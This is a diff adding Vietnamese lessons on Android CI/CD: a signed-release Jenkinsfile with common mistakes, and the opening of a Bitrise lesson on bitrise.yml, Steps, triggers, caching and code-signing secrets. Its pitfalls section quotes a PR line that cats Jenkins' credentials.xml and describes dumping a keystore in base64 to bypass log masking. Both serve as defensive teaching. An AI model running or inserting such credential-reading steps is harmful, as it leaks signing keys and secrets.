+  <li><code>when</code> chỉ cho stage chạy với tag khớp <code>v*</code>; nhờ <code>agent none</code> ở gốc và <code>beforeAgent true</code>, điều kiện sai thì không tốn agent.</li>
+  <li><code>versionCode</code> = số commit tới tag (<code>git rev-list --count HEAD</code>), vì <code>BUILD_NUMBER</code> của Multibranch đếm riêng cho từng tag (Sai lầm 3).</li>
+  <li><code>withCredentials</code> gắn keystore và ba secret text thành đúng các biến <code>signingConfigs.release</code> đọc (đoạn chuẩn ở <a href="github_ci.md" target="_blank" rel="noopener">11.4</a>); file tạm tự xoá khi hết khối.</li>
+  <li><code>bundleRelease</code> với <code>versionCode</code> vừa tính, <code>versionName</code> là tag bỏ chữ <code>v</code> (hai Gradle property của 11.4).</li>
+  <li>Lưu AAB và <code>mapping.txt</code> làm artifact (<a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4</a>).</li>
+  <li><code>withCredentials</code> gắn JSON của service account; Gradle Play Publisher upload AAB lên track <code>internal</code>.</li>
+  <li><code>post { cleanup }</code> xoá workspace, AAB đã ký không nằm lại trên agent.</li>
+</ol>
+
+<div class="mermaid">
+flowchart TD
+    T["Push tag v1.4.0"] --&gt; W{"(1) Tag khớp v*?"}
+    W --&gt;|"Không"| S["Bỏ qua, không cấp agent"]
+    W --&gt;|"Có"| V["(2) versionCode = git rev-list --count HEAD"]
+    V --&gt; K["(3) withCredentials: keystore, mật khẩu, alias"]
+    K --&gt; B["(4) ./gradlew bundleRelease"]
+    B --&gt; R["(5) archiveArtifacts: AAB, mapping.txt"]
+    R --&gt; U["(6) publishReleaseBundle lên track internal"]
+    U --&gt; C["(7) cleanup: xoá workspace"]
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="groovy"><code>// Jenkinsfile.release (job android-app-release)
+pipeline {
+    agent none
+    environment {
+        GRADLE_USER_HOME = '/gradle-cache'
+    }
+    options {
+        timeout(time: 45, unit: 'MINUTES')
+        buildDiscarder(logRotator(numToKeepStr: '50', artifactNumToKeepStr: '20'))
+    }
+    stages {
+        stage('Release') {
+            when {
+                beforeAgent true
+                tag pattern: 'v*', comparator: 'GLOB'                           // (1)
+            }
+            agent {
+                dockerfile {
+                    filename 'ci/android-sdk.Dockerfile'
+                    label 'linux-docker'
+                    args '-v $HOME/.gradle-ci:/gradle-cache'
+                }
+            }
+            stages {
+                stage('Build signed AAB') {
+                    steps {
+                        script {
+                            env.VERSION_CODE = sh(script: 'git rev-list --count HEAD', returnStdout: true).trim()   // (2)
+                        }
+                        withCredentials([                                       // (3)
+                            file(credentialsId: 'android-release-keystore', variable: 'RELEASE_STORE_FILE'),
+                            string(credentialsId: 'android-release-store-password', variable: 'RELEASE_STORE_PASSWORD'),
+                            string(credentialsId: 'android-release-key-alias', variable: 'RELEASE_KEY_ALIAS'),
+                            string(credentialsId: 'android-release-key-password', variable: 'RELEASE_KEY_PASSWORD')
+                        ]) {
+                            sh './gradlew bundleRelease -PversionCode="$VERSION_CODE" -PversionName="\${TAG_NAME#v}"'   // (4)
+                        }
+                        archiveArtifacts artifacts: 'app/build/outputs/bundle/release/*.aab, app/build/outputs/mapping/release/mapping.txt',
+                            fingerprint: true                                   // (5)
+                    }
+                }
+                stage('Upload to Play internal') {
+                    steps {
+                        withCredentials([file(credentialsId: 'play-service-account', variable: 'PLAY_SERVICE_ACCOUNT_JSON')]) {   // (6)
+                            sh '''
+                                ANDROID_PUBLISHER_CREDENTIALS="$(cat "$PLAY_SERVICE_ACCOUNT_JSON")" \\
+                                    ./gradlew publishReleaseBundle --artifact-dir app/build/outputs/bundle/release
+                            '''
+                        }
+                    }
+                }
+            }
+            post {
+                cleanup {
+                    cleanWs()                                                  // (7) plugin Workspace Cleanup
+                }
+            }
+        }
+    }
+}</code></pre>
+
+<p><code>RELEASE_STORE_FILE</code> là đường dẫn tuyệt đối tới file tạm, <code>file()</code> của <code>signingConfigs.release</code> dùng thẳng. <code>--artifact-dir</code> upload đúng AAB đã lưu ở bước (5).</p>
+
+<p><strong>Kết quả:</strong> push tag <code>v1.4.0</code> → job con <code>v1.4.0</code> chạy; Build Artifacts có AAB và <code>mapping.txt</code>; log stage upload báo thành công và <strong>Play Console &gt; Testing &gt; Internal testing</strong> có bản mới. Job <code>android-app-pr</code> không thấy credential release nào.</p>
+
+<h2>Khi nào nên và không nên dùng</h2>
+
+<p><strong>Nên chọn</strong> khi mã nguồn và keystore không được rời hạ tầng nội bộ, Git server trong mạng công ty, tổ chức đã vận hành Jenkins, hoặc cần phần cứng riêng (KVM, thiết bị thật).</p>
+
+<p><strong>Không nên</strong> khi team nhỏ, repo trên GitHub.com, không ràng buộc dữ liệu (<a href="github_ci.md" target="_blank" rel="noopener">11.4</a>); cần cả iOS mà không muốn nuôi máy Mac (<a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a>); hoặc không ai được giao cập nhật Jenkins định kỳ.</p>
+
+<p><strong>Cái giá:</strong> không trả theo phút build, nhưng trả bằng máy chủ và thời gian quản trị: vá controller, agent, plugin; backup <code>JENKINS_HOME</code>; thay plugin ngừng phát triển (như plugin upload Play).</p>
+
+<h2>Sai lầm thường gặp</h2>
+
+<h3>1. Build ngay trên controller</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> một PR thêm <code>sh 'cat $JENKINS_HOME/credentials.xml'</code> là đọc được credentials đã mã hoá, khoá giải mã nằm cùng máy; build Gradle nặng còn làm giao diện treo.</p>
+
+<p><strong>Cách sửa:</strong> executor của built-in node về 0, build trên agent.</p>
+
+<h3>2. Chèn secret bằng nháy kép</h3>
+
+<pre data-lang="groovy"><code>sh "./gradlew bundleRelease -Pandroid.injected.signing.store.password=\${RELEASE_STORE_PASSWORD}"   // sai</code></pre>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> Jenkins cảnh báo secret bị truyền vào <code>sh</code> qua Groovy String interpolation; mật khẩu nằm trong dòng lệnh, <code>ps</code> trên agent là thấy.</p>
+
+<p><strong>Cách sửa:</strong> nháy đơn, để <code>signingConfigs</code> đọc biến môi trường.</p>
+
+<h3>3. Lấy <code>BUILD_NUMBER</code> làm versionCode trong Multibranch</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> mỗi nhánh, PR, tag là một job con có bộ đếm riêng; build đầu của tag <code>v1.4.0</code> có <code>BUILD_NUMBER</code> là 1, giống tag <code>v1.3.0</code>. Play từ chối vì versionCode đã dùng.</p>
+
+<p><strong>Cách sửa:</strong> dùng nguồn tăng đơn điệu: số commit tới tag (tag luôn tạo trên <code>main</code>; không bật shallow clone, vì khi đó số đếm chỉ bằng độ sâu clone), quy đổi từ tên tag, hoặc <code>BUILD_NUMBER</code> của một job Pipeline thường chuyên release. App đã có <code>versionCode</code> cao hơn thì cộng offset như 11.4.</p>
+
+<h3>4. Credential release đặt Global</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> người có quyền push mở PR thêm <code>withCredentials</code> vào <code>Jenkinsfile</code>, in <code>base64</code> của keystore ra log; masking không bắt vì chuỗi đã khác.</p>
+
+<p><strong>Cách sửa:</strong> credential release trong folder của job release, tách job PR và release, giới hạn ai được tạo tag <code>v*</code> và ai được cấu hình job release (Matrix Authorization, Role-based Authorization Strategy).</p>
+
+<h2>Lịch sử phát triển</h2>
+
+<ul>
+  <li><strong>2004–2005:</strong> Kohsuke Kawaguchi viết <strong>Hudson</strong> tại Sun Microsystems.</li>
+  <li><strong>2011:</strong> sau tranh chấp tên với Oracle, cộng đồng tách dự án thành <strong>Jenkins</strong>.</li>
+  <li><strong>2014–2017:</strong> plugin Workflow (sau là Pipeline) đưa pipeline thành code; Jenkins 2.0 (04/2016) lấy <code>Jenkinsfile</code> làm cách dùng chính; Declarative Pipeline 1.0 ra 02/2017.</li>
+  <li><strong>2024–2026:</strong> Java 17 là tối thiểu từ LTS 2.479.1 (10/2024); sau LTS 2.541.3 và weekly 2.544 cần Java 21 hoặc 25.</li>
+</ul>
+
+<h2>Kết nối hệ thống</h2>
+
+<ul>
+  <li><strong>Tiên quyết:</strong> <a href="index.md" target="_blank" rel="noopener">11.0 Tổng quan Session 11</a>; <a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> (hai pipeline chuẩn, <code>signingConfigs.release</code>, versionCode, service account, track); <a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a>, <a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a> (ký app, Play App Signing).</li>
+  <li><strong>Liên quan:</strong> <a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a> (task của PR check); <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a> (task theo variant); <a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4 Fit / Bug Optimization</a> (đọc crash bằng <code>mapping.txt</code>).</li>
+  <li><strong>Học tiếp:</strong> <a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a> (hai pipeline trên CI SaaS chuyên mobile), <a href="travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a>.</li>
+</ul>
+
+<h2>Tham khảo</h2>
+
+<ul>
+  <li><a href="https://www.jenkins.io/doc/book/pipeline/syntax/" target="_blank" rel="noopener">Pipeline Syntax - Jenkins User Documentation</a></li>
+  <li><a href="https://www.jenkins.io/doc/book/pipeline/multibranch/" target="_blank" rel="noopener">Branches and Pull Requests - Jenkins User Documentation</a></li>
+  <li><a href="https://www.jenkins.io/doc/book/pipeline/docker/" target="_blank" rel="noopener">Using Docker with Pipeline - Jenkins User Documentation</a></li>
+  <li><a href="https://www.jenkins.io/doc/book/security/controller-isolation/" target="_blank" rel="noopener">Controller Isolation - Jenkins User Documentation</a></li>
+  <li><a href="https://www.jenkins.io/doc/book/platform-information/support-policy-java/" target="_blank" rel="noopener">Java Support Policy - Jenkins</a></li>
+  <li><a href="https://www.jenkins.io/doc/pipeline/steps/credentials-binding/" target="_blank" rel="noopener">Credentials Binding plugin steps - Jenkins</a></li>
+  <li><a href="https://plugins.jenkins.io/github-branch-source/" target="_blank" rel="noopener">GitHub Branch Source plugin - Jenkins Plugins</a></li>
+  <li><a href="https://plugins.jenkins.io/google-play-android-publisher/" target="_blank" rel="noopener">Google Play Android Publisher plugin - Jenkins Plugins</a></li>
+  <li><a href="https://developers.google.com/android-publisher/edits" target="_blank" rel="noopener">Edits - Google Play Developer API</a></li>
+  <li><a href="https://developer.android.com/tools/sdkmanager" target="_blank" rel="noopener">sdkmanager - Android Developers</a></li>
+  <li><a href="https://developer.android.com/tools/agents/android-cli/commands/sdk_install" target="_blank" rel="noopener">android sdk install - Android CLI</a></li>
+  <li><a href="https://github.com/Triple-T/gradle-play-publisher" target="_blank" rel="noopener">Gradle Play Publisher - GitHub</a></li>
+</ul>
+    `
+  },
+
+  'bitrise': {
+    title: 'Bitrise',
+    summary: 'Bitrise là nền tảng CI/CD dạng SaaS chuyên cho mobile; bitrise.yml gồm các Workflow, mỗi Workflow là chuỗi Step có version lấy từ Step Library, chạy trên máy ảo sạch dựng từ stack có sẵn công cụ mobile. Bài dạy Step, trigger, Pipeline, cache, Secrets, Code Signing & Files qua pipeline PR check và Release.',
+    status: 'published',
+    difficulty: 'intermediate',
+    estimatedReadingTime: '14 phút',
+    depth: 'standard',
+    tags: ['android', 'session-11', 'cicd', 'bitrise', 'bitrise-yml', 'step-library', 'code-signing'],
+    domain: 'Android',
+    module: 'Session 11',
+    prerequisites: ['android.cicd.overview', 'android.cicd.github_ci', 'android.manifest.build_types'],
+    related: ['android.cicd.jenkins', 'android.cicd.travis_ci', 'android.output_packages.aab_files', 'android.manifest.product_flavors', 'android.testing.lint', 'android.testing.unit_testing', 'android.testing.fit_bug_optimization'],
+    learningOutcomes: [
+      'Giải thích được mô hình của Bitrise gồm bitrise.yml, Workflow, Step từ Step Library, stack, trigger và Pipeline.',
+      'Triển khai được pipeline PR check bằng bitrise.yml với các Step lint, unit test, build, cache Gradle và Deploy to Bitrise.io.',
+      'Xử lý được secret và code signing trên Bitrise bằng Secrets, Code Signing & Files và các biến BITRISEIO_ANDROID_KEYSTORE_*.',
+      'Triển khai được pipeline Release trên tag v* để build AAB đã ký và upload lên internal track bằng Step Google Play Deploy.',
+      'Biết khi nào nên chọn Bitrise thay vì GitHub Actions hoặc Jenkins, và cái giá phải trả.'
+    ],
+    knowledgeGap: 'Nhiều team dùng Bitrise chỉ qua Workflow Editor: kéo thả Step, không pin version, không biết Step chạy task Gradle nào. Hệ quả: build đỏ sau một bản cập nhật Step, keystore dùng sai, build Pull Request ghi cache hoặc đọc được file khoá, cấu hình CI không ai review.',
+    updatedAt: '2026-11-10',
+    readTime: '14 phút',
+    content: `
+<h2>Vấn đề cần giải quyết</h2>
+
+<p><a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> dựng pipeline Android (<a href="index.md" target="_blank" rel="noopener">11.0</a>) bằng GitHub Actions. Với team mobile, cách đó vẫn phải tự ghép:</p>
+
+<ul>
+  <li><strong>Máy build</strong> đa dụng: Android SDK, emulator tự cài hoặc nhờ action cộng đồng; app có cả iOS cần thêm máy macOS.</li>
+  <li><strong>Bước đặc thù mobile</strong> (ký AAB, upload Play, gom report test, trang cài APK cho QA): mỗi việc là một action bên thứ ba hoặc một đoạn script.</li>
+</ul>
+
+<p>Cần nơi chạy pipeline có máy build sẵn công cụ mobile, các bước mobile đóng gói thành khối có version, team chỉ chọn khối và thông số.</p>
+
+<h2>Sau khi học xong</h2>
+
+<ul>
+  <li>Giải thích được mô hình của Bitrise gồm bitrise.yml, Workflow, Step từ Step Library, stack, trigger và Pipeline.</li>
+  <li>Triển khai được pipeline PR check bằng bitrise.yml với các Step lint, unit test, build, cache Gradle và Deploy to Bitrise.io.</li>
+  <li>Xử lý được secret và code signing trên Bitrise bằng Secrets, Code Signing &amp; Files và các biến BITRISEIO_ANDROID_KEYSTORE_*.</li>
+  <li>Triển khai được pipeline Release trên tag v* để build AAB đã ký và upload lên internal track bằng Step Google Play Deploy.</li>
+  <li>Biết khi nào nên chọn Bitrise thay vì GitHub Actions hoặc Jenkins, và cái giá phải trả.</li>
+</ul>
+
+<h2>Bitrise là gì?</h2>
+
+<p><strong>Bitrise</strong> là nền tảng CI/CD dạng <strong>SaaS</strong> chuyên cho mobile: pipeline được mô tả trong file <strong><code>bitrise.yml</code></strong> gồm các <strong>Workflow</strong>, mỗi Workflow là một chuỗi <strong>Step</strong> có version lấy từ <strong>Step Library</strong>, và Bitrise chạy chúng trên một máy ảo sạch dựng từ <strong>stack</strong> (image có sẵn JDK, Android SDK hoặc Xcode).</p>
+
+<p>Mental model, nối với dây chuyền của <a href="index.md" target="_blank" rel="noopener">11.0</a>: Bitrise là <strong>xưởng đã lắp sẵn máy (stack), mỗi cổng ráp từ linh kiện đúc sẵn</strong>. Step là linh kiện có mã và số phiên bản (<code>android-build@1</code>), Workflow là một đoạn dây chuyền chạy trên một máy, Pipeline nối nhiều Workflow. Bạn chỉ chọn linh kiện và chỉnh thông số (input).</p>
+
+<h2>Cách hoạt động</h2>
+
+<h3>Cấu trúc <code>bitrise.yml</code></h3>
+
+<p>Các khoá cấp cao nhất hay dùng:</p>
+
+<ul>
+  <li><code>format_version</code>: bắt buộc, Bitrise CLI dùng để kiểm tra tương thích (ví dụ trong docs hiện là <code>'25'</code>).</li>
+  <li><code>default_step_lib_source</code>: Step Library dùng khi Step không ghi nguồn, <code>https://github.com/bitrise-io/bitrise-steplib.git</code>.</li>
+  <li><code>meta</code> → <code>bitrise.io</code>: <code>stack</code> và <code>machine_type_id</code> mặc định; Workflow ghi đè bằng <code>meta</code> riêng.</li>
+  <li><code>app</code> → <code>envs</code>: biến môi trường cấp project.</li>
+  <li><code>workflows</code>: mỗi Workflow có <code>steps</code>, <code>envs</code>, <code>triggers</code>, <code>meta</code>, <code>status_report_name</code>.</li>
+  <li><code>step_bundles</code>: nhóm Step dùng lại, chèn bằng <code>bundle::&lt;tên&gt;</code>.</li>
+  <li><code>pipelines</code>: nhóm Workflow có phụ thuộc.</li>
+  <li><code>trigger_map</code>: trigger kiểu cũ (legacy) cấp project.</li>
+</ul>
+
+<p><strong>Stack</strong> là image của máy ảo: stack Linux có Android SDK và nhiều bản JDK, stack macOS có Xcode và cả công cụ Android. Alias <code>ubuntu-latest-stable</code> đổi theo stack Stable hiện tại; muốn tái lập thì ghi ID cụ thể (<a href="https://bitrise.io/stacks/stack_reports/" target="_blank" rel="noopener">stack reports</a>) và nâng định kỳ, vì mỗi stack đi qua edge → stable → frozen → bị gỡ, mỗi giai đoạn khoảng một năm.</p>
+
+<p><strong>Workflow Editor và YAML trong repo:</strong> mặc định <code>bitrise.yml</code> nằm trên bitrise.io, sửa bằng Workflow Editor. Nên <strong>lưu trong repo</strong> (mặc định ở gốc): build của nhánh nào đọc <code>bitrise.yml</code> của nhánh đó, thay đổi CI được review qua Pull Request. Nhánh mặc định luôn phải có file hợp lệ.</p>
+
+<h3>Step và Step Library</h3>
+
+<p>Step là chương trình nhỏ có <code>step.yml</code> khai báo <strong>input</strong>, <strong>output</strong> và điều kiện chạy; Step Library (<code>bitrise-io/bitrise-steplib</code>) giữ mọi version đã phát hành. Cú pháp: <code>&lt;nguồn&gt;::&lt;step-id&gt;@&lt;version&gt;</code>. Bỏ nguồn thì dùng <code>default_step_lib_source</code>; <strong>bỏ version thì lấy bản mới nhất</strong>, kể cả major có thay đổi phá vỡ. Nên <strong>pin major</strong>: <code>android-build@1</code> nhận các bản 1.x, không tự lên 2.0.</p>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Step (major hiện hành)</th>
+      <th style="padding:8px 12px;text-align:left;">Chạy gì</th>
+      <th style="padding:8px 12px;text-align:left;">Output, ghi chú</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>git-clone@8</code>, <code>set-java-version@1</code></td>
+      <td style="padding:8px 12px;">Checkout (PR thì lấy trạng thái đã merge); chọn JDK</td>
+      <td style="padding:8px 12px;"><code>JAVA_HOME</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>android-lint@1</code></td>
+      <td style="padding:8px 12px;"><code>lint&lt;Variant&gt;</code></td>
+      <td style="padding:8px 12px;">Copy report vào <code>$BITRISE_DEPLOY_DIR</code> rồi mới báo đỏ nếu task Gradle đỏ</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>android-unit-test@1</code></td>
+      <td style="padding:8px 12px;"><code>test&lt;Variant&gt;UnitTest</code></td>
+      <td style="padding:8px 12px;">Report HTML/XML, tab Test Reports</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>android-build@1</code></td>
+      <td style="padding:8px 12px;"><code>assemble&lt;Variant&gt;</code> hoặc <code>bundle&lt;Variant&gt;</code> (<code>build_type</code>)</td>
+      <td style="padding:8px 12px;"><code>BITRISE_APK_PATH</code>, <code>BITRISE_AAB_PATH</code>, <code>BITRISE_MAPPING_PATH</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>gradle-runner@6</code></td>
+      <td style="padding:8px 12px;">Task bất kỳ (<code>gradle_task</code>)</td>
+      <td style="padding:8px 12px;">Copy APK/AAB/<code>mapping.txt</code> vào <code>$BITRISE_DEPLOY_DIR</code>, output như trên</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>deploy-to-bitrise-io@2</code></td>
+      <td style="padding:8px 12px;">Đưa <code>$BITRISE_DEPLOY_DIR</code> lên trang build: artifact, test report, trang cài APK cho QA (<code>is_enable_public_page</code>)</td>
+      <td style="padding:8px 12px;">Mặc định <code>is_always_run: true</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>google-play-deploy@4</code></td>
+      <td style="padding:8px 12px;">Upload APK/AAB lên Google Play</td>
+      <td style="padding:8px 12px;"></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Task theo variant học ở <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a>, task lint/test ở <a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a> và <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a>. <code>gradle-runner</code> không gom report như Step chuyên dụng. Stack thiếu thành phần SDK thì thêm <code>install-missing-android-tools@3</code>.</p>
+
+<p>Step thất bại thì <strong>các Step sau bị bỏ qua</strong>, trừ Step có <code>is_always_run: true</code>. <code>run_if</code> nhận biểu thức Go template: <code>.IsCI | and (not .IsPR)</code> chỉ đúng khi build không đến từ Pull Request. Output là biến môi trường cho Step sau: <code>android-build</code> ghi <code>BITRISE_AAB_PATH</code>, <code>google-play-deploy</code> mặc định đọc nó.</p>
+
+<h3>Một build chạy thế nào</h3>
+
+<ol>
+  <li>Git provider gửi webhook (push, Pull Request, tag).</li>
+  <li>Bitrise so với trigger, xếp hàng mọi target khớp.</li>
+  <li>Mỗi target được dựng một máy ảo sạch từ stack.</li>
+  <li>Bitrise CLI nạp biến theo thứ tự: biến của CLI (<code>BITRISE_BUILD_NUMBER</code>, <code>BITRISE_DEPLOY_DIR</code>...), Secrets, <code>app.envs</code>, <code>envs</code> của Workflow, rồi input của từng Step.</li>
+  <li>Chạy Step tuần tự; <code>deploy-to-bitrise-io</code> đưa artifact và report lên trang build.</li>
+  <li>Gửi trạng thái về Git provider, huỷ máy ảo.</li>
+</ol>
+
+<div class="mermaid">
+sequenceDiagram
+    participant Git as GitHub
+    participant B as bitrise.io
+    participant VM as Máy ảo từ stack
+    Git-&gt;&gt;B: (1) webhook push, PR hoặc tag
+    B-&gt;&gt;B: (2) so trigger, xếp hàng target khớp
+    B-&gt;&gt;VM: (3) dựng máy ảo sạch
+    VM-&gt;&gt;VM: (4) nạp biến CLI, Secrets, app.envs, envs
+    VM-&gt;&gt;B: (5) chạy Step, deploy-to-bitrise-io gửi artifact
+    B-&gt;&gt;Git: (6) gửi trạng thái, huỷ máy ảo
+</div>
+
+<p>Máy ảo bị huỷ sau mỗi build: file tải về (keystore) không sống sang build sau; thứ cần giữ phải qua cache hoặc artifact.</p>
+
+<h3>Trigger</h3>
+
+<ul>
+  <li><strong>Target-based trigger</strong> (khuyến nghị): khoá <code>triggers</code> trong Workflow hoặc Pipeline; Bitrise xét mọi trigger và <strong>mọi target khớp đều chạy</strong>.</li>
+  <li><strong><code>trigger_map</code></strong> (legacy, cấp project): trigger khớp đầu tiên chạy <strong>một</strong> build.</li>
+</ul>
+
+<p>Loại trigger: <code>push</code> (<code>branch</code>, <code>commit_message</code>, <code>changed_files</code>), <code>pull_request</code> (<code>source_branch</code>, <code>target_branch</code>, <code>label</code>, <code>draft_enabled</code>, <code>comment</code>...), <code>tag</code> (<code>name</code>). Mọi điều kiện trong một mục phải cùng khớp; điều kiện bỏ trống mặc định là <code>*</code> (riêng <code>draft_enabled</code> mặc định <code>true</code>). Chuỗi là wildcard; cần biểu thức chính quy thì đặt khoá <code>regex:</code> dưới điều kiện (ví dụ ở pipeline Release).</p>
+
+<h3>Pipeline: nhiều Workflow có phụ thuộc</h3>
+
+<p><strong>Pipeline</strong> (viết hoa: đối tượng <code>pipelines</code> của Bitrise, khác pipeline theo nghĩa 11.0) gom nhiều Workflow, thứ tự khai báo bằng <code>depends_on</code>; Workflow không phụ thuộc nhau chạy song song, mỗi Workflow một máy ảo. Workflow chỉ chạy khi mọi Workflow nó phụ thuộc thành công (trừ khi <code>should_always_run: workflow</code>); <code>abort_on_fail: true</code> dừng cả Pipeline; <code>parallel: N</code> chạy N bản sao để chia shard test. Dạng cũ chia theo <strong>stages</strong> sẽ không được cập nhật nữa.</p>
+
+<h4>Ví dụ: chạy lint và unit test song song trước khi build</h4>
+
+<p><strong>Bài toán:</strong> lint 6 phút, unit test 8 phút; chạy tuần tự thì PR chờ 14 phút.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>PR vào <code>main</code> khớp trigger của Pipeline.</li>
+  <li><code>lint</code> và <code>unit-test</code> chạy song song trên hai máy ảo.</li>
+  <li><code>build-debug</code> chỉ chạy khi cả hai xanh; một cái đỏ thì Pipeline đỏ.</li>
+</ol>
+
+<div class="mermaid">
+flowchart LR
+    T["(1) PR vào main"] --&gt; L["(2) lint"]
+    T --&gt; U["(2) unit-test"]
+    L --&gt; B["(3) build-debug"]
+    U --&gt; B
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># bitrise.yml: trích pipelines (mỗi Workflow tự có bundle::setup và deploy-to-bitrise-io)
+pipelines:
+  pr-pipeline:
+    triggers:
+      pull_request:
+      - target_branch: main               # (1)
+    workflows:
+      lint: {}                            # (2)
+      unit-test: {}                       # (2)
+      build-debug:
+        depends_on: [lint, unit-test]     # (3)</code></pre>
+
+<p><strong>Kết quả:</strong> trang build hiện đồ thị ba Workflow, PR chờ khoảng 8 phút cộng bước build. Đổi lại, mỗi Workflow tự clone, restore cache; chuyển file giữa Workflow phải qua input <code>pipeline_intermediate_files</code> của <code>deploy-to-bitrise-io</code> và Step <code>pull-intermediate-files</code>.</p>
+
+<h3>Cache cho Gradle</h3>
+
+<ul>
+  <li><strong>Key-based caching:</strong> <code>restore-gradle-cache@3</code> ở đầu, <code>save-gradle-cache@1</code> ở cuối; Step tự đặt key và đường dẫn cho dependency Gradle; archive không dùng 7 ngày liên tục thì bị xoá. Bitrise khuyến nghị <strong>không để build PR ghi cache</strong>: đặt <code>run_if: ".IsCI | and (not .IsPR)"</code> cho Step save.</li>
+  <li><strong>Bitrise Build Cache for Gradle</strong> (Step <code>activate-build-cache-for-gradle</code>, đặt trước mọi Step chạy Gradle): remote build cache cho output task, dùng chung giữa các build và máy local; là sản phẩm riêng.</li>
+</ul>
+
+<p><code>cache-pull</code>/<code>cache-push</code> (branch-based caching) là cơ chế legacy.</p>
+
+<h3>Secrets, Env Vars và Code Signing &amp; Files</h3>
+
+<p>Khái niệm secret học ở <a href="github_ci.md" target="_blank" rel="noopener">github_ci.md</a>. Bitrise có ba nơi giữ giá trị:</p>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Nơi</th>
+      <th style="padding:8px 12px;text-align:left;">Dùng cho</th>
+      <th style="padding:8px 12px;text-align:left;">Đọc trong build</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Env Vars</strong> (<code>app.envs</code>, <code>envs</code>)</td>
+      <td style="padding:8px 12px;">Giá trị không bí mật</td>
+      <td style="padding:8px 12px;"><code>$PACKAGE_NAME</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Secrets</strong> (Workflow Editor → Secrets)</td>
+      <td style="padding:8px 12px;">Mật khẩu, token</td>
+      <td style="padding:8px 12px;"><code>$TÊN</code>; log hiện <code>[REDACTED]</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Code Signing &amp; Files</strong> (Project settings → Code signing, Files)</td>
+      <td style="padding:8px 12px;">Keystore, file khoá</td>
+      <td style="padding:8px 12px;">Biến <code>BITRISEIO_..._URL</code> chứa URL tải file</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Mặc định <strong>build từ Pull Request không thấy Secrets</strong> (kể cả PR từ fork), trừ khi bật <strong>Expose for Pull Requests?</strong> cho từng secret; vì vậy PR check phải chạy được không cần secret. Secret <strong>Protected</strong> không ai xem hay sửa lại được (muốn đổi phải xoá rồi tạo lại).</p>
+
+<p><strong>Keystore</strong> tải lên ở <strong>Project settings → Code signing → Android → Add keystore file</strong>, kèm Keystore password, Key alias, Private key password. Bitrise sinh <code>BITRISEIO_ANDROID_KEYSTORE_URL</code> (URL tải chỉ đọc, <strong>có hạn dùng</strong>, không phải đường dẫn file), <code>BITRISEIO_ANDROID_KEYSTORE_PASSWORD</code>, <code>BITRISEIO_ANDROID_KEYSTORE_ALIAS</code>, <code>BITRISEIO_ANDROID_KEYSTORE_PRIVATE_KEY_PASSWORD</code>. Bitrise giữ chính file, không cần base64 như <code>RELEASE_KEYSTORE_BASE64</code> của 11.4.</p>
+
+<p><strong>File khác</strong> tải ở <strong>Project settings → Files → Add file</strong> với một <strong>File Storage ID</strong> (tối đa 5 MB); URL tải nằm trong <code>BITRISEIO_&lt;ID&gt;_URL</code>, ví dụ ID <code>PLAY_SERVICE_ACCOUNT_JSON</code> cho khoá service account thì biến là <code>BITRISEIO_PLAY_SERVICE_ACCOUNT_JSON_URL</code>.</p>
+
